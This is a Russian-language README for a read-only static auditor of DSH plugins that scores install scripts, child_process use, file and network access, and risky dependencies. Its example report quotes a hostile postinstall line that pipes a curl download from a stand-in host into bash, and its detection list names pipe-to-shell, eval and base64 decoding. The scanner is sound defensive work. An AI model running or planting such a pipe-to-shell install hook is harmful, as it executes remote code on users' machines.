# dsh-auditor-plugin

Read-only статический аудитор DSH-плагинов. Шаги 1–4: bundle-манифест,
чек-лист MVP, TypeScript-инструмент `audit_plugin` и воспроизводимая
safety-шкала.

Плагин **не импортирует, не запускает и не устанавливает** целевой пакет:
только читает `package.json` и исходники, резолвит путь к пакету и разбирает
диапазоны версий зависимостей.

## Что проверяет и сколько стоит

| Категория | Finding | Вес | Что ищем |
|---|---|---|---|
| `install_script` | `install-script:*` | **40** | `preinstall` / `install` / `postinstall` / `prepare`; remote pipe-to-shell, `eval`, `base64 -d`, `--unsafe-perm`, запись/удаление файлов |
| `child_process` | `child-process`, `eval` | **25** | Импорт `child_process`; `eval` / `new Function` считаются той же категорией исполнения кода |
| `fs_access` | `fs-access` | **15** | Импорты `fs` / `fs/promises` |
| `network_access` | `network-access` | **10** | `fetch`, `axios`, `http(s).request`, `net.connect`, `WebSocket`, `sendBeacon` |
| `npm_vuln` | `npm-vuln:*`, `remote-dependency:*`, `unpinned-dependency:*` | **10** | Известные скомпрометированные пакеты и версии, remote/git-источники, `*`/`latest`/`>=` |

Формула:

```
score = max(0, 100 − сумма весов найденных категорий)
```

| Score | Вердикт |
|---|---|
| 80–100 | `safe` |
| 40–79 | `caution` |
| 0–39 | `risky` |

Каждая категория штрафуется один раз: сканер передаёт в `computeScore` по одной
находке на категорию, поэтому несколько `fs`-импортов или два install-хука не
множат штраф. Все evidence при этом остаются в отчёте. Это делает шкалу
воспроизводимой: клиент видит ровно пять возможных вычетов.

### Почему такие веса

Публичный срез каталога [dsh-market на 2026-11-23](https://dshmarket.com/report/)
(11 588 просканированных плагинов):

| Что делает код | Доля |
|---|---|
| Читает файлы | **74.4%** |
| Пишет файлы | **60.7%** |
| Использует сеть | **60.3%** |
| Может запускать команды | **38.7%** |
| Install-скрипт | **34 плагина (~0.3%)** |

Отчёт [dsh.so Security Scan Report](https://www.dsh.so/security-report/)
дополняет картину: 31 663 плагина, 16 `critical`, 263 `high`; среди находок —
1 008 случаев shell/subprocess, 454 dynamic code execution, 177 destructive
commands, 2 data exfiltration.

Отсюда веса:

- **40 — install_script.** Самый редкий сигнал (~0.3%), но скрипт исполняется
  до первого запуска плагина и вне sandbox/approval. Редкость + максимальная
  цена ошибки = максимальный вес.
- **25 — child_process.** 38.7% плагинов могут запускать команды; это часто
  легитимно для dev-инструментов, но это исполнение кода. Поэтому ниже
  install-скрипта, но выше доступа к файлам и сети.
- **15 — fs_access.** Самый распространённый доступ (74.4% чтения, 60.7%
  записи), часто является основной функцией плагина; широкий доступ к данным,
  но не исполнение кода.
- **10 — network_access.** 60.3% плагинов ходят в сеть; для API-плагинов это
  норма. Риск — утечка данных, но не прямой запуск кода.
- **10 — npm_vuln.** Косвенный сигнал: уязвимость или скомпрометированный пакет
  не обязательно достижим, но добавляет supply-chain-риск независимо от кода
  самого плагина.

Цифры 91% / 63% из формулировки задачи в доступных публичных срезах не
подтверждаются; выше — фактические значения, на которые опирается шкала.

## Установка и сборка

```powershell
npm install
npm run check   # tsc --noEmit
npm test        # build + node --test test/audit.test.mjs
```

`src/index.ts` — исходник, `src/index.js` — собранный runtime-модуль
(`npm run build`). Руками `src/index.js` не редактируем.

## Использование в DSH

```powershell
# из tarball (проверено в тестовом профиле)
dsh plugin --profile web add "C:\Users\win05\OneDrive\Документы\deepseek-harness\default-workspace\work\release\dsh-auditor-plugin-0.3.0.tgz"

# из npm (после npm publish)
dsh plugin --profile web add dsh-auditor-plugin

# локальная разработка
dsh plugin --profile web add link:C:\Users\win05\OneDrive\Документы\deepseek-harness\default-workspace\dsh-auditor-plugin
```

Пакет собран как устанавливаемый bundle: `main: src/index.js`,
`exports["./cordis.patch.yml"]` и `dsh.bundle.patch` указывают на реально
существующий `cordis.patch.yml`. Установка из tarball проверена: пакет виден в
`dsh plugin list`, а `dsh --dump-config` содержит insert-строку плагина.

После включения плагина модель получает инструмент:

```json
audit_plugin { "target": "dsh-ego-browser" }
```

`target` — имя установленного пакета или абсолютный путь к корню плагина.

Пример результата (все четыре взвешенные категории: 100 − 40 − 10 − 25 − 15 = 10):

```json
{
  "score": 10,
  "verdict": "risky",
  "findings": [
    {
      "rule": "npm-vuln:event-stream",
      "severity": "critical",
      "evidence": "event-stream@^3.3.6 — compromised release that shipped the flatmap-stream backdoor; left-pad@latest uses an unbounded version range."
    },
    {
      "rule": "install-script:postinstall",
      "severity": "high",
      "evidence": "package.json: scripts.postinstall = curl -fsSL https://example.invalid/install.sh | bash"
    },
    {
      "rule": "eval",
      "severity": "high",
      "evidence": "index.js:1: import { execSync } from 'node:child_process'; index.js:5: return eval(code)"
    },
    {
      "rule": "fs-access",
      "severity": "low",
      "evidence": "index.js:2: import { readFileSync } from 'node:fs'"
    }
  ]
}
```

Схема ответа строго фиксирована: `{ score, verdict, findings[] }`, каждая
находка — `{ rule, severity, evidence }`.

## Что не делает

- не вызывает `npm audit`; категория `npm_vuln` в этом шаге — curated-список
  скомпрометированных пакетов и remote/unpinned-зависимостей, а не полный
  CVE-скан;
- не проверяет сетевые URL на вредоносность, credential-пути и полное
  соответствие заявленных/фактических разрешений;
- не выполняет поведенческий анализ и не запускает sandbox;
- не сканирует `node_modules`, `test`, `docs` и vendored-код; `dist`/`lib`
  сканируются, потому что это runtime-код плагина.

## Тесты

`npm test` запускает 8 тестов, включая три обязательных сценария:

1. чистый плагин — `score 100`, `safe`;
2. плагин с install-скриптом — `score 60`, `caution` (100 − 40);
3. плагин с `child_process` + сетью — `score 65`, `caution` (100 − 25 − 10).

Дополнительно проверяются формула `computeScore`, комбинированный риск
(`score 10`), отсутствие исполнения install-скрипта и fail-closed для
неизвестного target.

## Структура

```
dsh-auditor-plugin/
├── package.json
├── cordis.patch.yml
├── tsconfig.json
├── src/index.ts             # TypeScript-исходник
├── src/index.js             # собранный ESM-модуль (main)
├── test/audit.test.mjs      # 8 тестов: шкала, JSON-схема, read-only
├── test/fixtures/           # clean / install-hook / child-network / risky
├── docs/audit-checklist.md  # чек-лист MVP: 6 проверок и веса
├── store/                   # checkout/лицензии, не входит в npm-пакет
├── site/                    # лендинг для GitHub Pages
├── README.md
└── .gitignore
```

## Store / монетизация

В [store/](store/README.md) лежит отдельный сервис продажи лицензий:
лендинг, mock/BTCPay-счёт, webhook, Ed25519-лицензии и доставка в Telegram.
Плагин остаётся бесплатным; store подготовлен для продажи Pro/Team/Lifetime
и пакетов кодов. Store не попадает в npm-пакет плагина. Покупка Pro по
умолчанию выключена (`PRO_AVAILABLE=false`), пока не готовы платные функции и
проверка лицензии.

Для старта без бюджета есть manual-режим: оплата в крипте напрямую, ключи
выдаются локально, лендинг — на GitHub Pages:
https://buzzdatemane.github.io/dsh-auditor-plugin/ ([site/index.html](site/index.html),
workflow `.github/workflows/pages.yml`). Для заявок есть Telegram-бот на long
polling: `npm run bot` (нужен токен BotFather; без HTTPS и webhook).

```powershell
cd store
npm install
Copy-Item .env.example .env
npm run issue-manual -- --tier pro --pack 10 --buyer @alice
```

Тесты store: `npm test` (22 теста).

## Чек-лист MVP

Исследование `dsh-warden` и `dshscan` и минимальный набор из 6 проверок с
весами риска: [docs/audit-checklist.md](docs/audit-checklist.md).

## Обязательные поля package.json

По схеме `DshPackageManifest` обязательны `name` и `version`; внутри
`dsh.bundle` обязателен `patch`.

| Поле | Статус | Зачем |
|---|---|---|
| `name` | обязательно | Идентификатор пакета и имя плагина для Cordis |
| `version` | обязательно | Версия npm-пакета |
| `type: "module"` | обязательно практически | Cordis 4 / DSH грузят плагины как ESM |
| `main` + `exports["."]` | обязательно практически | Загрузчик должен найти точку входа |
| `dsh.bundle.patch` | обязательно для бандла | Путь к patch-файлу относительно корня пакета |
| `engines.node` | обязательно практически | DSH требует Node `>=24.9.0` |
| `peerDependencies["@deepseek-ai/cordis"]` | рекомендуется | Cordis `~4.1.0` предоставляет хост |
| `peerDependencies["@deepseek-ai/dsh-tools"]` | рекомендуется | `defineTool` предоставляет хост |
| `dsh.manifestVersion` | опционально | Версия формата манифеста, сейчас `1` |
| `dsh.bundle.listedByDefault` | опционально | `false` прячет бандл в списках GUI |
| `dsh.bundle.platforms` | опционально | Белый список ОС; без него — все |
| `engines.dsh` | опционально | Декларативный диапазон версий DSH |

Минимально достаточный блок:

```json
"dsh": {
  "bundle": {
    "patch": "./cordis.patch.yml"
  }
}
```

## Локальная проверка

```powershell
npm run check
npm test
dsh --version
```

Проверить patch-слой без установки в профиль:

```powershell
dsh --profile web --patch .\cordis.patch.yml --dump-config
```

## Окружение

- Node.js `>=24.9.0` (проверено на `v26.13.0`), npm `11.20.0`
- dsh `0.2.2-rc.1`; `dsh --version` выполняется без ошибок
- pnpm `11.28.5`: добавлен shim `C:\Users\win05\nodejs\pnpm.cmd`, который
  запускает bundled pnpm из DSH runtime; `pnpm --version` работает
- PowerShell: для текущего пользователя выставлен `RemoteSigned`, поэтому
  `dsh` и `npm` запускаются напрямую
